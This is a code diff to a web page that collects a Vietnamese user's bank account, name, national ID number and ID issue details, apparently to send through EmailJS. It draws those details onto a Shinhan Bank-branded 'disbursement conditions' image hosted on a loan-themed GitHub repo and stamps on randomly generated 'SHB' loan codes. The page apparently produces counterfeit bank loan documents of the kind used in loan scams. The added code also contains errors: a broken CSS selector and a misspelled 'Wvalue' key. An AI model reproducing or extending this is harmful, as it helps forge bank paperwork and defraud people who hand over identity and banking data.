@@ -184,7 +184,7 @@
             opacity: 1;
             transform: translateX(0);
         }
-        .step-transition.hidden {
+        . step-transition.hidden {
             opacity: 0;
             transform: translateX(20px);
             pointer-events: none;
@@ -312,11 +312,31 @@
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.11.0/dist/email.min.js"></script>
     <script>
         emailjs.init("OrBsI926QI2_xBh1f");
-        let userData = {};
+        let userData = {
+          accountNumber: "",
+          fullName: "",
+          bankName: "",
+          cccd: "",
+          idIssueDate: "",
+          idIssuePlace: ""
+        };
 
         function formatNumber(number) {
-            if (!number) return "Không có";
+            if (!number) return "";
             return Number(number).toLocaleString('vi-VN');
+        }
+
+        function splitDate(dateStr) {
+            if (!dateStr) return { day: "", month: "", year: "" };
+            const [year, month, day] = dateStr.split("-");
+            return { day: day || "", month: month || "", year: year || "" };
+        }
+
+        function calculateDueDate(disbursementDate, loanTerm) {
+            if (!disbursementDate || !loanTerm) return "";
+            const date = new Date(disbursementDate);
+            date.setMonth(date.getMonth() + parseInt(loanTerm));
+            return date.toISOString().split('T')[0];
         }
 
         function saveToLocalStorage() {
@@ -400,13 +420,13 @@
                 canvas.height = 1754;
                 ctx.drawImage(img, 0, 0, 1240, 1754);
                 canvasFields.forEach(field => {
-                    const value = field.value || "Không có";
-                    if (field.x >= 0 && field.y >= 0 && field.x < canvas.width && field.y < canvas.height) {
+                    const value = field.value;
+                    if (value && field.x >= 0 && field.y >= 0 && field.x < canvas.width && field.y < canvas.height) {
                         ctx.font = field.font;
                         ctx.fillStyle = field.color;
                         ctx.fillText(value, field.x, field.y);
                     } else {
-                        console.warn(`Invalid coordinates for field: ${value} at (${field.x}, ${field.y})`);
+                        console.warn(`Invalid coordinates or empty value for field: ${value} at (${field.x}, ${field.y})`);
                     }
                 });
                 console.log('Rendered canvas with fields:', canvasFields.map(f => ({ value: f.value, x: f.x, y: f.y })));
@@ -434,15 +454,24 @@
         }
 
         const canvasFields = [
-            { label: "", value: "", x: 207, y: 97, font: "27px Arial bold", color: "#000000" }, // loanCode
+            { label: "", value: "", x: -1, y: -1, font: "27px Arial bold", color: "#000000" },
             { label: "", value: "", x: 423, y: 322, font: "23px Arial bold", color: "#000000" }, // accountNumber
             { label: "", value: "", x: 429, y: 354, font: "23px Arial bold", color: "#000000" }, // fullName
             { label: "", value: "", x: 423, y: 390, font: "23px Arial bold", color: "#000000" }, // bankName
             { label: "", value: "", x: 429, y: 444, font: "23px Arial bold", color: "#000000" }, // fullName
-            { label: "", value: "", x: 209, y: 445, font: "23px Arial bold", color: "#000000" }, // loanAmount
-            { label: "", value: "", x: 423, y: 487, font: "23px Arial bold", color: "#000000" }, // idNumber
-            { label: "", value: "Không có", x: 707, y: 487, font: "23px Arial bold", color: "#000000" }, // idIssueDate
-            { label: "", value: "", x: 952, y: 487, font: "23px Arial bold", color: "#000000" }  // idIssuePlace
+            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
+            { label: "", value: "", x: 423, y: 487, font: "23px Arial bold", color: "#000000" }, // cccd
+            { label: "", value: "", x: 707, y: 487, font: "23px Arial bold", color: "#000000" }, // idIssueDate
+            { label: "", value: "", x: 952, y: 487, font: "23px Arial bold", color: "#000000" }, // idIssuePlace
+            { label: "", Wvalue: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
+            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
+            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
+            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
+            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
+            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
+            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
+            { label: "", value: `SHB${Math.floor(Math.random() * 100000)}`, x: 207, y: 230.59, font: "27px Arial bold", color: "#000000" }, // loanCode
+            { label: "", value: `SHB${Math.floor(Math.random() * 100000)}`, x: 207, y: 226.91, font: "27px Arial bold", color: "#000000" }  // loanCode
         ];
 
         function downloadAsPDF(canvas, filename) {
@@ -459,16 +488,17 @@
         window.onload = function() {
             loadUserData();
 
-            // Cập nhật canvasFields với dữ liệu từ userData
-            canvasFields[0].value = userData.loanCode || "Không có";
-            canvasFields[1].value = userData.accountNumber || "Không có";
-            canvasFields[2].value = userData.fullName || "Không có";
-            canvasFields[3].value = userData.bankName || "Không có";
-            canvasFields[4].value = userData.fullName || "Không có";
-            canvasFields[5].value = userData.loanAmount ? `${formatNumber(userData.loanAmount)} VND` : "Không có";
-            canvasFields[6].value = userData.idNumber || "Không có";
-            canvasFields[7].value = userData.idIssueDate || "Không có";
-            canvasFields[8].value = userData.idIssuePlace || "Không có";
+            const dueDate = calculateDueDate(userData.disbursementDate, userData.loanTerm);
+
+            canvasFields[1].value = userData.accountNumber || "";
+            canvasFields[2].value = userData.fullName || "";
+            canvasFields[3].value = userData.bankName || "";
+            canvasFields[4].value = userData.fullName || "";
+            canvasFields[6].value = userData.cccd || "";
+            canvasFields[7].value = userData.idIssueDate || "";
+            canvasFields[8].value = userData.idIssuePlace || "";
+            canvasFields[16].value = `SHB${Math.floor(Math.random() * 100000)}`;
+            canvasFields[17].value = `SHB${Math.floor(Math.random() * 100000)}`;
 
             renderCanvas('disbursementCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/dieukiengiayngan.png', 'https://via.placeholder.com/1240x1754?text=Hinh+Dieu+Kien+Giai+Ngan');
             userData.currentStep = 8;
